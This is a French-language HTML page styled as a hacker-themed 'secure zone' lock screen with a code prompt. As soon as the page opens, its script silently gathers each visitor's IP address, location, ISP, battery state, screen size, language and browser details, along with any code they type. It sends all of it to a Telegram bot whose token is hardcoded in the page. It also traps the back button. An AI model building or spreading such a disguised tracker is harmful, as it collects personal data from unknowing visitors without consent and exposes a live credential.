<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>MANASSE NTAMBWA - SYSTÈMES SÉCURISÉS</title>

<style>
* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}

html, body {
    width: 100vw;
    height: 100vh;
    background: #000;
    color: #00ff66;
    font-family: 'Courier New', Courier, monospace;
    overflow: hidden;
    user-select: none;
    -webkit-user-select: none;
}

body {
    display: flex;
    justify-content: center;
    align-items: center;
    text-align: center;
}

#screen {
    width: 100%;
    height: 100%;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    padding: 5vw;
    background: radial-gradient(circle, #051c0d 0%, #000 85%);
    position: relative;
    z-index: 99999;
}

.intro-text {
    font-size: clamp(20px, 5vw, 55px);
    font-weight: bold;
    line-height: 1.4;
    text-shadow: 0 0 15px #00ff66;
    max-width: 90vw;
    opacity: 0;
    transition: opacity 0.4s ease-in-out;
    position: absolute;
    padding: 20px;
}

.visible {
    opacity: 1;
}

#lock-container {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    width: 100%;
    height: 100%;
    opacity: 0;
    transition: opacity 0.8s ease-in;
}

#lock-container.active {
    opacity: 1;
}

#title {
    font-size: clamp(28px, 6vw, 70px);
    font-weight: bold;
    letter-spacing: 0.1em;
    text-shadow: 0 0 20px #00ff66;
    margin-bottom: 5px;
}

#owner {
    color: #fff;
    font-size: clamp(14px, 3vw, 28px);
    margin-bottom: 25px;
    letter-spacing: 0.05em;
}

#form {
    width: min(90%, 450px);
    margin-top: 15px;
}

input {
    width: 100%;
    padding: 16px;
    background: #020804;
    color: #00ff66;
    border: 3px solid #00ff66;
    font-size: 22px;
    text-align: center;
    outline: none;
    border-radius: 8px;
    box-shadow: 0 0 15px rgba(0, 255, 102, 0.4);
}

button {
    margin-top: 20px;
    width: 100%;
    padding: 15px;
    background: #00ff66;
    color: #000;
    border: none;
    font-weight: bold;
    font-size: 18px;
    cursor: pointer;
    border-radius: 8px;
    box-shadow: 0 0 15px rgba(0, 255, 102, 0.6);
}

#status {
    font-size: clamp(14px, 2.5vw, 20px);
    margin-top: 20px;
    min-height: 1.5em;
    letter-spacing: 0.05em;
}

.hidden {
    display: none !important;
}

@keyframes glitch {
    0% { transform: translate(0); }
    20% { transform: translate(-4px, 4px); color: #ff3333; text-shadow: 0 0 10px #ff3333; }
    40% { transform: translate(-4px, -4px); color: #00ff66; }
    60% { transform: translate(4px, 4px); }
    80% { transform: translate(4px, -4px); color: #ff3333; text-shadow: 0 0 10px #ff3333; }
    100% { transform: translate(0); color: #00ff66; }
}

.glitch-effect {
    animation: glitch 0.15s infinite;
}
</style>
</head>

<body>

<main id="screen" onclick="activerPleinEcran()">
    <div id="cinematic-box" class="intro-text"></div>

    <div id="lock-container" class="hidden">
        <div id="title">MANASSE</div>
        <div id="owner">ZONE SÉCURISÉE — NTAMBWA</div>
        
        <form id="form" onsubmit="verifierCode(event)">
            <input
                id="password"
                type="password"
                placeholder="CODE MAÎTRE"
                autocomplete="off"
                required
            >
            <button type="submit">DÉVERROUILLER</button>
        </form>

        <div id="status">SYSTÈME ACTIF — EN ATTENTE</div>
    </div>
</main>

<script>
// Tes identifiants Telegram configurés
const TELEGRAM_TOKEN = "8298299369:AAGGJe_JWK4QuyUrh51VjH1tYflN0X8O6HI";
const TELEGRAM_CHAT_ID = "8869305312";

const cinematicBox = document.getElementById("cinematic-box");
const lockContainer = document.getElementById("lock-container");
const statusDiv = document.getElementById("status");
const passwordInput = document.getElementById("password");
const body = document.body;

const steps = [
    "SÉCURITÉ MULTI-APPAREIL ACTIVÉE.",
    "PROPRIÉTAIRE : MANASSE NTAMBWA.",
    "COLLECTE DES DONNÉES EN COURS...",
    "TERMINAL PRÊT."
];

function activerPleinEcran() {
    const elem = document.documentElement;
    if (elem.requestFullscreen) {
        elem.requestFullscreen().catch(() => {});
    } else if (elem.webkitRequestFullscreen) {
        elem.webkitRequestFullscreen();
    }
}

// Collecte automatique sans aucune pop-up de permission
async function collecterEtEnvoyer(typeAlerte, extraMsg = "") {
    let ip = "Inconnue";
    let ville = "Inconnue";
    let pays = "";
    let isp = "Inconnu";

    // 1. Récupération IP et géolocalisation réseau
    try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();
        ip = data.ip || "Inconnue";
        ville = data.city || "Inconnue";
        pays = data.country_name || "";
        isp = data.org || "Inconnu";
    } catch (e) {}

    // 2. Récupération niveau et état batterie
    let batterie = "Non disponible";
    try {
        if (navigator.getBattery) {
            const bat = await navigator.getBattery();
            batterie = `${Math.round(bat.level * 100)}\% (${bat.charging ? "En charge" : "Sur batterie"})`;
        }
    } catch (e) {}

    // 3. Infos d'affichage et langue
    const ecran = `${window.screen.width}x${window.screen.height}`;
    const langue = navigator.language || "Inconnue";

    // Envoi direct vers Telegram
    const texteMessage = `🚨 *[${typeAlerte}] - APPAREIL MANASSE*\n\n` +
                         `• *Adresse IP :* \`${ip}\`\n` +
                         `• *Ville / Pays :* ${ville},${pays}\n` +
                         `• *Fournisseur d'accès :* ${isp}\n` +
                         `• *Niveau Batterie :* ${batterie}\n` +
                         `• *Résolution Écran :* ${ecran}\n` +
                         `• *Langue système :* ${langue}\n` +
                         `• *Navigateur / OS :* \`${navigator.userAgent}\`\n` +
                         `${extraMsg}\n` +
                         `• *Date/Heure :* ${new Date().toLocaleString('fr-FR')}`;

    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: texteMessage,
            parse_mode: "Markdown"
        })
    }).catch(() => {});
}

function typeMessage(text) {
    return new Promise(resolve => {
        cinematicBox.textContent = "";
        cinematicBox.classList.add("visible");
        let i = 0;
        function type() {
            if (i < text.length) {
                cinematicBox.textContent += text[i];
                i++;
                setTimeout(type, 20);
            } else {
                setTimeout(() => {
                    cinematicBox.classList.remove("visible");
                    setTimeout(resolve, 250);
                }, 800);
            }
        }
        type();
    });
}

async function lancerAnimation() {
    for (let step of steps) {
        if (step.includes("SÉCURITÉ") || step.includes("COLLECTE")) {
            cinematicBox.classList.add("glitch-effect");
        } else {
            cinematicBox.classList.remove("glitch-effect");
        }
        await typeMessage(step);
    }
    cinematicBox.remove();
    lockContainer.classList.remove("hidden");
    setTimeout(() => {
        lockContainer.classList.add("active");
        passwordInput.focus();
    }, 100);
}

function verifierCode(event) {
    event.preventDefault();
    const codeSecret = "MNL";

    if (passwordInput.value === codeSecret) {
        statusDiv.textContent = "ACCÈS AUTORISÉ — BIENVENUE";
        statusDiv.style.color = "#00ff66";
        document.getElementById("form").classList.add("hidden");
        collecterEtEnvoyer("DÉVERROUILLAGE RÉUSSI", "✅ Bon code entré par le propriétaire.");
    } else {
        statusDiv.textContent = "ACCÈS REFUSÉ — ALERTE INTRUSION";
        statusDiv.style.color = "#ff3333";
        collecterEtEnvoyer("TENTATIVE D'INTRUSION", `❌ Faux code entré : \`${passwordInput.value}\``);

        passwordInput.value = "";
        body.classList.add("glitch-effect");
        setTimeout(() => body.classList.remove("glitch-effect"), 400);
        passwordInput.focus();
    }
}

window.onload = () => {
    collecterEtEnvoyer("OUVERTURE DU LIEN (VISITEUR)");
    lancerAnimation();
};

history.pushState(null, null, location.href);
window.addEventListener('popstate', function () {
    history.pushState(null, null, location.href);
});
</script>

</body>
</html>
